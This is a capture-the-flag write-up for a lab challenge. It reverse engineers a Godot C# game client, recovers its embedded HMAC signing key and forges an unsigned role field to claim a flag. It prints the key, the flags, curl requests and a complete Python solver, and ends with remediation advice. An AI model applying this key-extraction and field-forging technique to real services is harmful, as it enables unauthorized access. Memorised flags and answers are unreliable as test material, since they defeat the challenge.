# Grand Larceny Auto II

## Challenge overview

| Field | Value |
|---|---|
| Challenge | Grand Larceny Auto II |
| Category | Reverse Engineering / Web |
| Target | `10.48.173.225` |
| Client | Godot 4 with C#/.NET |
| Flag | `THM{Th4ts_th3_wr0ng_g4m3_t0mmy}` |

The challenge provides a packaged game client and a remote lab machine. The description makes two important points:

- the visible vault is not the real objective;
- obtaining the flag requires understanding how the game communicates with its backend.

The intended route is therefore to reverse engineer the client, reproduce its proof-of-play protocol, and inspect how the final claim is authorized.

## Contents

- [Reconnaissance](#reconnaissance)
- [Extracting the client](#extracting-the-client)
- [Identifying the decoys](#identifying-the-decoys)
- [Recovering the backend protocol](#recovering-the-backend-protocol)
- [Understanding the proof-of-play flow](#understanding-the-proof-of-play-flow)
- [Finding the authorization flaw](#finding-the-authorization-flaw)
- [Exploitation](#exploitation)
- [Automated solver](#automated-solver)
- [Flag](#flag)
- [Remediation](#remediation)

## Reconnaissance

A full TCP scan exposed SSH and an HTTP service:

```bash
nmap -Pn -sV -p- --min-rate 2000 10.48.173.225
```

Relevant results:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Microsoft Kestrel httpd
```

Requesting `/` returned `404 Not Found`, which suggested that port 80 hosted an API rather than a conventional website.

## Extracting the client

The supplied file was a 7-Zip archive containing Linux and Windows builds:

```bash
file GrandLarcenyAuto-1786669683173.7z
7z l GrandLarcenyAuto-1786669683173.7z
```

Only the Linux build was needed:

```bash
7z x GrandLarcenyAuto-1786669683173.7z \
  GrandLarcenyAuto/GrandLarcenyAuto-linux-x86_64.zip

unzip GrandLarcenyAuto/GrandLarcenyAuto-linux-x86_64.zip -d gla2-linux
```

The extracted files included:

```text
GrandLarcenyAuto.x86_64
GrandLarcenyAuto.pck
data_GrandLarcenyAuto_linuxbsd_x86_64/GrandLarcenyAuto.dll
data_GrandLarcenyAuto_linuxbsd_x86_64/GodotSharp.dll
```

The presence of `GodotSharp.dll` and the game-specific managed assembly showed that the client was a Godot C# application. This made the small `GrandLarcenyAuto.dll` the primary reverse-engineering target.

Useful initial commands were:

```bash
strings -a -el -n 4 \
  gla2-linux/data_GrandLarcenyAuto_linuxbsd_x86_64/GrandLarcenyAuto.dll

monodis --typedef \
  gla2-linux/data_GrandLarcenyAuto_linuxbsd_x86_64/GrandLarcenyAuto.dll

monodis --method \
  gla2-linux/data_GrandLarcenyAuto_linuxbsd_x86_64/GrandLarcenyAuto.dll
```

The most relevant classes were:

```text
GrandLarcenyAuto.CheatConsole
GrandLarcenyAuto.GameController
GrandLarcenyAuto.PoPClient
GrandLarcenyAuto.SafehouseVault
```

## Identifying the decoys

Two convincing-looking flags were embedded directly in the client. Neither was accepted as the challenge flag.

### Cheat console decoy

`CheatConsole.Submit()` compared the supplied code to:

```text
L0SV4NT0S247
```

Entering it returned:

```text
THM{ch34t_c0d3s_4r3_f0r_t0ur1sts}
```

This matched the description's warning that the cheat console lies.

### Local vault decoy

`SafehouseVault.TryOpen()` returned another hard-coded value:

```text
THM{th3_v4ult_w4s_4_d3c0y}
```

Because this value never came from the backend, it was also only a local decoy.

## Recovering the backend protocol

The `PoPClient` class contained all client-server logic. Static analysis recovered the following configuration:

```text
Server URL: http://gla2.thm
Signing key: gla2_crew_sign_v1_2f9b6c8ad14e
```

The lab hostname was mapped to the supplied target IP during testing. The client used three POST endpoints:

| Endpoint | Purpose |
|---|---|
| `POST /session` | Create a proof-of-play session |
| `POST /checkpoint` | Submit gameplay checkpoints in order |
| `POST /claim` | Claim the flag after completing the sequence |

### Session creation

A session was created with an empty JSON object:

```bash
curl -sS \
  -H 'Content-Type: application/json' \
  -d '{}' \
  http://10.48.173.225/session
```

Example response:

```json
{
  "session_id": "7VVzgOQ15XaWGA4TpiGLuUef",
  "stash_order": [0, 2, 1],
  "token": "f48NUK1-_cZBRBOrpI2A-r2-"
}
```

The stash order is generated per session, so it must be read dynamically rather than hard-coded.

### Checkpoint signing

For every checkpoint, the client builds the following message:

```text
<session_id>|<step>|<token>
```

It then calculates:

```text
HMAC-SHA256(signing_key, message)
```

The digest is encoded as lowercase hexadecimal and sent as `sig`:

```json
{
  "session_id": "...",
  "step": "heat5",
  "token": "...",
  "sig": "..."
}
```

Each accepted checkpoint returns a new token. This rotating token must be used to sign the next request.

## Understanding the proof-of-play flow

The game controller showed that the required checkpoint sequence was:

```text
heat5 -> stash<first> -> stash<second> -> stash<third> -> vault
```

For the example session, the order was:

```text
heat5 -> stash0 -> stash2 -> stash1 -> vault
```

The backend also enforced timing between accepted stash events. Submitting the next stash approximately one second after the previous one returned:

```json
{"error":"too_fast","need":5,"got":1.14}
```

Waiting six seconds between checkpoints safely satisfies the five-second minimum.

After the complete sequence, the final checkpoint response contained `"next": null`, indicating that the session was ready for a claim.

## Finding the authorization flaw

The normal client submits a final claim with the role `player`:

```json
{
  "session_id": "...",
  "role": "player",
  "token": "...",
  "sig": "..."
}
```

However, the claim signature was calculated only over:

```text
<session_id>|claim|<token>
```

The `role` field was not included in the signed data. An attacker who knows the client signing key can therefore change the role without invalidating the signature.

The client also exposed an otherwise unused method named `DeriveStaffRole()`. It constructed this string from the session's stash order:

```text
heat5_stash0_stash2_stash1_vault
```

It then returned the lowercase SHA-1 digest of that string:

```bash
printf '%s' 'heat5_stash0_stash2_stash1_vault' | sha1sum
```

For the example session, the derived role was:

```text
21f0d2ffed625f9539d46368e76b88c74bdf2b1f
```

This value could replace `player` in the final claim because the role was not cryptographically bound to the request.

The vulnerability is an authorization design flaw: security-sensitive request fields are accepted independently of the authenticated message.

## Exploitation

The attack consisted of the following stages:

1. Create a session and record its session ID, stash order, and token.
2. Submit `heat5`, each stash in the returned order, and `vault`.
3. Respect the backend's minimum delay and update the rotating token after every accepted checkpoint.
4. Derive the hidden staff role from the completed route.
5. Sign `<session_id>|claim|<token>`.
6. Submit the valid signature with the derived staff role instead of `player`.

The server accepted the modified claim and returned:

```json
{"flag":"THM{Th4ts_th3_wr0ng_g4m3_t0mmy}"}
```

## Automated solver

The following solver uses only Python's standard library. Set `TARGET_URL` to the current lab machine before running it.

```python
#!/usr/bin/env python3

import hashlib
import hmac
import json
import os
import time
import urllib.error
import urllib.request


BASE_URL = os.environ.get("TARGET_URL")
SIGNING_KEY = b"gla2_crew_sign_v1_2f9b6c8ad14e"
CHECKPOINT_DELAY = 6


if not BASE_URL:
    raise SystemExit("Set TARGET_URL, for example: http://10.48.173.225")

BASE_URL = BASE_URL.rstrip("/")


def post(path: str, payload: dict) -> dict:
    request = urllib.request.Request(
        BASE_URL + path,
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )

    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            return json.load(response)
    except urllib.error.HTTPError as error:
        body = error.read().decode(errors="replace")
        raise RuntimeError(f"{path} returned HTTP {error.code}: {body}") from error


def sign(message: str) -> str:
    return hmac.new(
        SIGNING_KEY,
        message.encode(),
        hashlib.sha256,
    ).hexdigest()


session = post("/session", {})
session_id = session["session_id"]
stash_order = session["stash_order"]
token = session["token"]

steps = ["heat5"]
steps.extend(f"stash{stash_id}" for stash_id in stash_order)
steps.append("vault")

print(f"Session: {session_id}")
print(f"Stash order: {stash_order}")

for step in steps:
    time.sleep(CHECKPOINT_DELAY)

    signature = sign(f"{session_id}|{step}|{token}")
    result = post(
        "/checkpoint",
        {
            "session_id": session_id,
            "step": step,
            "token": token,
            "sig": signature,
        },
    )

    if "error" in result:
        raise RuntimeError(f"Checkpoint {step} failed: {result}")

    token = result["token"]
    print(f"Accepted: {step}")

route = "heat5_" + "_".join(
    f"stash{stash_id}" for stash_id in stash_order
) + "_vault"

staff_role = hashlib.sha1(route.encode()).hexdigest()
claim_signature = sign(f"{session_id}|claim|{token}")

claim = post(
    "/claim",
    {
        "session_id": session_id,
        "role": staff_role,
        "token": token,
        "sig": claim_signature,
    },
)

if "flag" not in claim:
    raise RuntimeError(f"Claim failed: {claim}")

print(f"Flag: {claim['flag']}")
```

Run it with:

```bash
TARGET_URL=http://10.48.173.225 python3 solve.py
```

## Flag

```text
THM{Th4ts_th3_wr0ng_g4m3_t0mmy}
```

## Remediation

The backend should not trust a client-controlled role, even when the surrounding request is signed. A robust implementation should:

- derive authorization roles entirely on the server;
- bind every security-sensitive field, including `role`, into the authenticated message;
- keep signing secrets out of distributed client applications;
- associate checkpoint state and token rotation with server-side session data;
- use a modern keyed construction for any capability value rather than an unkeyed SHA-1 digest.

The central lesson is that a valid signature only protects the fields covered by that signature. Any omitted authorization field remains attacker-controlled.
